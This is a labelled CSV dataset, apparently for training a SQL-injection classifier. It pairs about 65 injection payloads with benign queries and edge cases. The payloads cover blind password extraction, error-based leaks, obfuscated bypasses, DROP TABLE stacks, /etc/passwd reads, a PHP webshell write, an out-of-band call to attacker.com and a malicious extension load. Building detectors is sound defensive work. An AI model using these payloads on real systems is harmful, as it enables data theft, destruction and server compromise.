query,label,category,description
"' AND LENGTH(database())>5--",1,boolean_blind,"Database length probe"
"' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>50--",1,boolean_blind,"Password extraction"
"1' AND 1=1 AND '1'='1",1,boolean_blind,"Nested boolean"
"' AND EXISTS(SELECT * FROM users)--",1,boolean_blind,"EXISTS probe"
"' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--",1,boolean_blind,"Password char probe"
"' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",1,error_based,"ExtractValue"
"' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",1,error_based,"UpdateXML"
"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,"Double query"
"' AND GTID_SUBSET(@@version,1)--",1,error_based,"GTID subset"
"' AND EXP(~(SELECT * FROM (SELECT @@version)a))--",1,error_based,"Exp overflow"
"' ORDER BY 1--",1,error_based,"Order by probe"
"' ORDER BY 10--",1,error_based,"Order by column count"
"' ORDER BY 100--",1,error_based,"Order by overflow"
"' HAVING 1=1--",1,error_based,"Having clause"
"' GROUP BY columnname HAVING 1=1--",1,error_based,"Group by having"
"' oR '1'='1",1,obfuscated_case,"Mixed case OR"
"' Or 1=1--",1,obfuscated_case,"Mixed case Or"
"' uNiOn SeLeCt NuLl--",1,obfuscated_case,"Mixed case UNION SELECT"
"' UnIoN sElEcT 1,2,3--",1,obfuscated_case,"Alternating case"
"' aNd SlEeP(5)--",1,obfuscated_case,"Mixed case AND SLEEP"
"'; dRoP tAbLe UsErS--",1,obfuscated_case,"Mixed case DROP TABLE"
"'  OR   '1'='1",1,obfuscated_whitespace,"Extra spaces"
"'	OR	1=1--",1,obfuscated_whitespace,"Tab characters"
"' \t OR \t 1=1--",1,obfuscated_whitespace,"Mixed whitespace"
"'  UNION  SELECT  NULL--",1,obfuscated_whitespace,"Spaced UNION"
"'		UNION		SELECT		1,2,3--",1,obfuscated_whitespace,"Tab UNION"
"'/**/OR/**/1=1--",1,obfuscated_comment,"Inline comment OR"
"'/*x*/OR/*y*/'1'='1",1,obfuscated_comment,"Named comments"
"' /*!OR*/ 1=1--",1,obfuscated_comment,"MySQL version comment"
"'/**/UNION/**/SELECT/**/NULL--",1,obfuscated_comment,"Comment UNION"
"'/*abc*/UNION/*def*/SELECT/*ghi*/1,2,3--",1,obfuscated_comment,"Multi comment"
"' /*!50000OR*/ 1=1--",1,obfuscated_comment,"Version conditional"
"admin'/**/--",1,obfuscated_comment,"Comment bypass"
"' OR 'a'||'b'='ab",1,obfuscated_concat,"Concat Oracle"
"' OR CONCAT('1','1')='11",1,obfuscated_concat,"MySQL concat"
"' OR CHR(49)||CHR(61)||CHR(49)--",1,obfuscated_concat,"Chr concat"
"' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--",1,obfuscated_concat,"CHAR concat"
"' OR 0x31=0x31--",1,obfuscated_encoded,"Hex encoded"
"' UNION SELECT 0x61646d696e--",1,obfuscated_encoded,"Hex string"
"' %4fR 1=1--",1,obfuscated_encoded,"URL encoded O"
"' OR%201=1--",1,obfuscated_encoded,"URL encoded space"
"'%27 OR 1=1--",1,obfuscated_encoded,"URL encoded quote"
"' %55NION %53ELECT NULL--",1,obfuscated_encoded,"URL encoded keywords"
"admin%27--",1,obfuscated_encoded,"URL encoded username"
"SELECT * FROM users WHERE id = '1' OR '1'='1'",1,full_injection_select,"Full SELECT injection"
"SELECT * FROM users WHERE username = '' OR 1=1--'",1,full_injection_select,"Full username bypass"
"SELECT * FROM products WHERE id = 1 UNION SELECT 1,2,3,4,5--",1,full_injection_select,"Full UNION attack"
"SELECT * FROM users WHERE email = 'test@x.com' AND SLEEP(5)--'",1,full_injection_select,"Full time attack"
"SELECT * FROM orders WHERE id = 1; DROP TABLE orders;--",1,full_injection_select,"Full stacked attack"
"INSERT INTO users (name) VALUES ('test' OR '1'='1');",1,full_injection_insert,"Insert injection"
"INSERT INTO logs (data) VALUES (''; DROP TABLE logs;--');",1,full_injection_insert,"Insert stacked"
"UPDATE users SET name = '' OR '1'='1' WHERE id = 1;",1,full_injection_update,"Update injection"
"UPDATE products SET price = 0 WHERE id = 1 OR 1=1;",1,full_injection_update,"Update tautology"
"DELETE FROM users WHERE id = 1 OR 1=1;",1,full_injection_delete,"Delete tautology"
"DELETE FROM sessions WHERE id = '' OR '1'='1';",1,full_injection_delete,"Delete injection"
"' UNION SELECT load_file('/etc/passwd')--",1,advanced,"File read"
"' UNION SELECT * INTO OUTFILE '/tmp/hack.txt'--",1,advanced,"File write"
"'; LOAD DATA INFILE '/etc/passwd' INTO TABLE hack--",1,advanced,"Load file"
"' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'--",1,advanced,"Webshell upload"
"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",1,advanced,"Nested sleep"
"' AND (SELECT count(*) FROM generate_series(1,10000000))--",1,advanced,"PostgreSQL DoS"
"' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",1,advanced,"Complex error based"
"'; DECLARE @q VARCHAR(8000);SET @q='\\\\attacker.com\\share';EXEC master..xp_dirtree @q--",1,advanced,"MSSQL out-of-band"
"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY X)y)--",1,advanced,"Double query complex"
"' AND LOAD_EXTENSION('/path/to/evil.so')--",1,advanced,"Extension loading"
"SELECT * FROM users WHERE user_id = $user_input;",0,placeholder,"Application placeholder"
"SELECT * FROM products WHERE category = ?;",0,placeholder,"Prepared statement marker"
"SELECT * FROM orders WHERE id = :order_id;",0,placeholder,"Named parameter"
"SELECT * FROM users WHERE created_at >= CURRENT_DATE - INTERVAL 30 DAY;",0,complex_benign,"Interval calculation"
"SELECT * FROM products WHERE price * 1.1 < 100;",0,complex_benign,"Expression in WHERE"
"SELECT COALESCE(nickname, username, 'Anonymous') FROM users;",0,complex_benign,"COALESCE function"
"SELECT CASE WHEN status = 'active' THEN 1 ELSE 0 END FROM users;",0,complex_benign,"CASE expression"
"SELECT * FROM users WHERE email REGEXP '^[a-zA-Z0-9]+@';",0,complex_benign,"REGEXP pattern"
"SELECT GREATEST(price, min_price) FROM products;",0,complex_benign,"GREATEST function"
"SELECT * FROM products WHERE MATCH(name, description) AGAINST('laptop');",0,complex_benign,"Full text search"
"WITH cte AS (SELECT * FROM users WHERE status = 'active') SELECT * FROM cte;",0,complex_benign,"CTE query"
"SELECT * FROM users u WHERE u.id = ANY(SELECT user_id FROM orders);",0,complex_benign,"ANY subquery"
"SELECT * FROM products FOR UPDATE;",0,complex_benign,"SELECT FOR UPDATE"
"SELECT GET_LOCK('my_lock', 10);",0,complex_benign,"Get lock function"
"EXPLAIN SELECT * FROM users WHERE id = 1;",0,complex_benign,"EXPLAIN query"
"SHOW TABLES;",0,complex_benign,"Show tables"
"DESCRIBE users;",0,complex_benign,"Describe table"
"SHOW CREATE TABLE users;",0,complex_benign,"Show create"
"SELECT * FROM inventory;",0,simple_select,"Basic table scan"
"SELECT * FROM payments;",0,simple_select,"Basic table scan"
"SELECT * FROM reviews;",0,simple_select,"Basic table scan"
"SELECT * FROM categories;",0,simple_select,"Basic table scan"
"SELECT * FROM shipping;",0,simple_select,"Basic table scan"
"SELECT * FROM addresses;",0,simple_select,"Basic table scan"
"SELECT * FROM coupons;",0,simple_select,"Basic table scan"
"SELECT * FROM wishlist;",0,simple_select,"Basic table scan"
"SELECT * FROM cart;",0,simple_select,"Basic table scan"
"SELECT * FROM notifications;",0,simple_select,"Basic table scan"
"SELECT id FROM users;",0,simple_select,"Single column"
"SELECT email FROM users;",0,simple_select,"Single column"
"SELECT name, price, stock FROM products;",0,simple_select,"Multiple columns"
"SELECT first_name, last_name, email, phone FROM customers;",0,simple_select,"Customer columns"
"SELECT order_id, total, created_at FROM orders WHERE user_id = 5;",0,simple_where,"User orders"
"SELECT * FROM products WHERE stock > 0;",0,simple_where,"In stock products"
"SELECT * FROM users WHERE last_login IS NOT NULL;",0,simple_where,"Active users"
"SELECT * FROM orders WHERE shipped_at IS NULL;",0,simple_where,"Pending orders"
"SELECT * FROM products WHERE name = 'MacBook Pro';",0,simple_where,"Product by name"
"SELECT * FROM users WHERE phone = '+1-555-123-4567';",0,simple_where,"Phone lookup"
"SELECT * FROM products WHERE sku = 'ABC-12345';",0,simple_where,"SKU lookup"
"SELECT * FROM orders WHERE tracking_number = 'TRK123456789';",0,simple_where,"Tracking lookup"
"SELECT COUNT(DISTINCT category_id) FROM products;",0,aggregate,"Distinct count"
"SELECT SUM(quantity * price) FROM order_items WHERE order_id = 100;",0,aggregate,"Order total"
"SELECT AVG(rating), COUNT(*) FROM reviews WHERE product_id = 50;",0,aggregate,"Product rating"
"SELECT MAX(total), MIN(total) FROM orders;",0,aggregate,"Order range"
"SELECT COUNT(*) FROM users WHERE created_at > DATE_SUB(NOW(), INTERVAL 7 DAY);",0,aggregate,"Recent users"
"SELECT * FROM products ORDER BY created_at DESC LIMIT 10;",0,order_limit,"Newest products"
"SELECT * FROM orders ORDER BY total DESC LIMIT 5;",0,order_limit,"Top orders"
"SELECT * FROM users ORDER BY last_login DESC LIMIT 100;",0,order_limit,"Recent logins"
"SELECT * FROM products ORDER BY stock ASC LIMIT 20;",0,order_limit,"Low stock"
"SELECT * FROM products LIMIT 50 OFFSET 100;",0,pagination,"Pagination query"
"SELECT * FROM users LIMIT 25 OFFSET 75;",0,pagination,"Pagination query"
"SELECT * FROM orders LIMIT 10 OFFSET 0;",0,pagination,"First page"
"SELECT DISTINCT brand FROM products;",0,distinct,"Distinct brands"
"SELECT DISTINCT city, country FROM addresses;",0,distinct,"Distinct locations"
"SELECT DISTINCT payment_method FROM payments;",0,distinct,"Payment methods"
"SELECT * FROM orders WHERE created_at >= '2024-06-01' AND created_at < '2024-07-01';",0,date_compare,"Month range"
"SELECT * FROM users WHERE birthday BETWEEN '1990-01-01' AND '1999-12-31';",0,date_compare,"Birth year range"
"SELECT * FROM sessions WHERE expires_at > NOW();",0,date_compare,"Valid sessions"
"SELECT * FROM coupons WHERE valid_until >= CURDATE();",0,date_compare,"Active coupons"
"SELECT * FROM products WHERE price >= 10 AND price <= 50;",0,numeric_compare,"Price range"
"SELECT * FROM orders WHERE item_count > 5;",0,numeric_compare,"Large orders"
"SELECT * FROM users WHERE login_count >= 100;",0,numeric_compare,"Power users"
"SELECT * FROM products WHERE rating >= 4.5;",0,numeric_compare,"Top rated"
"SELECT * FROM products WHERE category_id NOT IN (1, 2, 3);",0,in_clause,"NOT IN"
"SELECT * FROM users WHERE role IN ('admin', 'moderator', 'editor');",0,in_clause,"Role check"
"SELECT * FROM orders WHERE payment_status IN ('completed', 'refunded');",0,in_clause,"Payment status"
"SELECT * FROM products WHERE color IN ('red', 'blue', 'green', 'black', 'white');",0,in_clause,"Color filter"
"SELECT * FROM users WHERE middle_name IS NULL;",0,null_check,"Null middle name"
"SELECT * FROM products WHERE discount_price IS NOT NULL;",0,null_check,"Has discount"
"SELECT * FROM orders WHERE cancelled_at IS NOT NULL;",0,null_check,"Cancelled orders"
"SELECT * FROM users WHERE status = 'active' AND email_verified = 1 AND phone_verified = 1;",0,multi_condition,"Triple AND"
"SELECT * FROM products WHERE (category_id = 5 OR category_id = 6) AND is_active = 1;",0,multi_condition,"Mixed conditions"
"SELECT * FROM orders WHERE status != 'cancelled' AND total > 100;",0,multi_condition,"Not cancelled"
"SELECT * FROM users WHERE age >= 18 AND age <= 65 AND country = 'US';",0,multi_condition,"Age range US"
"SELECT u.*, p.* FROM users u INNER JOIN profiles p ON u.id = p.user_id;",0,join,"Inner join"
"SELECT o.*, u.email FROM orders o RIGHT JOIN users u ON o.user_id = u.id;",0,join,"Right join"
"SELECT p.name, c.name AS category FROM products p JOIN categories c ON p.category_id = c.id;",0,join,"Named join"
"SELECT * FROM orders o JOIN order_items oi ON o.id = oi.order_id JOIN products p ON oi.product_id = p.id;",0,join,"Triple join"
"SELECT u.name, COUNT(o.id) as order_count, SUM(o.total) as total_spent FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.id, u.name;",0,group_by,"Customer summary"
"SELECT DATE(created_at) as date, COUNT(*) as orders FROM orders GROUP BY DATE(created_at);",0,group_by,"Daily orders"
"SELECT category_id, COUNT(*), AVG(price), MAX(price) FROM products GROUP BY category_id HAVING COUNT(*) > 10;",0,group_by,"Category stats"
"SELECT YEAR(created_at), MONTH(created_at), SUM(total) FROM orders GROUP BY YEAR(created_at), MONTH(created_at);",0,group_by,"Monthly revenue"
"SELECT * FROM products WHERE description LIKE '%wireless%';",0,like,"Description search"
"SELECT * FROM users WHERE email LIKE '%@company.com';",0,like,"Company emails"
"SELECT * FROM products WHERE name LIKE 'Samsung%' OR name LIKE 'Apple%';",0,like,"Brand search"
"SELECT * FROM logs WHERE message LIKE '%error%' OR message LIKE '%warning%';",0,like,"Log search"
"INSERT INTO products (name, price, stock) VALUES ('New Product', 29.99, 100);",0,insert,"Product insert"
"INSERT INTO users (email, password_hash, created_at) VALUES ('new@example.com', 'hash123', NOW());",0,insert,"User registration"
"INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (100, 50, 2, 19.99);",0,insert,"Order item"
"INSERT INTO logs (level, message, created_at) VALUES ('INFO', 'User logged in', NOW());",0,insert,"Log entry"
"UPDATE products SET stock = stock - 1 WHERE id = 42;",0,update,"Decrement stock"
"UPDATE users SET last_login = NOW() WHERE id = 5;",0,update,"Login timestamp"
"UPDATE orders SET status = 'processing', updated_at = NOW() WHERE id = 100;",0,update,"Order status"
"UPDATE products SET price = price * 0.9 WHERE category_id = 5;",0,update,"Category discount"
"DELETE FROM sessions WHERE created_at < DATE_SUB(NOW(), INTERVAL 30 DAY);",0,delete,"Old sessions"
"DELETE FROM cart_items WHERE user_id = 42 AND product_id = 100;",0,delete,"Remove from cart"
"DELETE FROM notifications WHERE read_at IS NOT NULL AND created_at < DATE_SUB(NOW(), INTERVAL 90 DAY);",0,delete,"Old notifications"
"SELECT CURRENT_TIMESTAMP;",0,minimal,"Current timestamp"
"SELECT CURDATE();",0,minimal,"Current date"
"SELECT USER();",0,minimal,"Current user"
"SELECT @@sql_mode;",0,minimal,"SQL mode"
"SELECT CONNECTION_ID();",0,minimal,"Connection ID"
"SELECT LAST_INSERT_ID();",0,minimal,"Last insert ID"
"SELECT UUID();",0,minimal,"Generate UUID"
"SELECT * FROM products WHERE name = 'TRUNCATE Your Collection';",0,edge_case,"Product name contains TRUNCATE"
"SELECT * FROM products WHERE name = 'DELETE Me Not Flowers';",0,edge_case,"Product name contains DELETE"
"SELECT * FROM products WHERE name = 'INSERT Coin Arcade';",0,edge_case,"Product name contains INSERT"
"SELECT * FROM products WHERE name = 'UPDATE Your Wardrobe';",0,edge_case,"Product name contains UPDATE"
"SELECT * FROM products WHERE name = 'ALTER Ego Perfume';",0,edge_case,"Product name contains ALTER"
"SELECT * FROM products WHERE name = 'EXEC-utive Chair';",0,edge_case,"Product name contains EXEC"
"SELECT * FROM products WHERE name = '1=1 Equals One T-Shirt';",0,edge_case,"Product contains 1=1"
"SELECT * FROM products WHERE name = 'NULL and Void Game';",0,edge_case,"Product contains NULL"
"SELECT * FROM products WHERE sku = 'DROP-SHIP-001';",0,edge_case,"SKU contains DROP"
"SELECT * FROM products WHERE sku = 'SLEEP-WELL-002';",0,edge_case,"SKU contains SLEEP"
"SELECT * FROM users WHERE username = 'admin123';",0,edge_case,"Valid admin username"
"SELECT * FROM users WHERE username = 'test_user';",0,edge_case,"Test username"
"SELECT * FROM products WHERE description = 'Best seller -- highly recommended!';",0,edge_case,"Double dash in description"
"SELECT * FROM reviews WHERE comment = 'Works great; love it!';",0,edge_case,"Semicolon in comment"
"SELECT * FROM products WHERE notes = 'Available in sizes S, M, L -- order now!';",0,edge_case,"Double dash in notes"
"SELECT * FROM users WHERE bio = 'Developer @ Tech Corp; Python enthusiast';",0,edge_case,"Special chars in bio"
"SELECT * FROM products WHERE tags LIKE '%or%';",0,edge_case,"Tags with or"
"SELECT * FROM products WHERE keywords LIKE '%and%';",0,edge_case,"Keywords with and"
"SELECT * FROM users WHERE password_hint = 'My pet''s name + birth year';",0,edge_case,"Escaped quote in hint"
"SELECT * FROM contacts WHERE company = 'O''Reilly Media';",0,edge_case,"Company with apostrophe"
"SELECT * FROM users WHERE name = 'D''Angelo';",0,edge_case,"Name with apostrophe"
"SELECT * FROM addresses WHERE street = '123 O''Connor Street';",0,edge_case,"Street with apostrophe"
"SELECT * FROM products WHERE id > 0 AND price > 0;",0,edge_case,"Double positive conditions"
"SELECT * FROM users WHERE id = id;",0,edge_case,"Self equality"
"SELECT id, id FROM users LIMIT 5;",0,edge_case,"Duplicate column"
"SELECT 1+1, 2+2, 3+3;",0,edge_case,"Math expressions"
"SELECT 'hello', 'world';",0,edge_case,"String literals"
"SELECT NULL IS NULL;",0,edge_case,"Null check expression"
"SELECT TRUE, FALSE;",0,edge_case,"Boolean literals"
"SELECT * FROM (SELECT * FROM users WHERE id < 10) AS subq;",0,subquery,"Derived table"
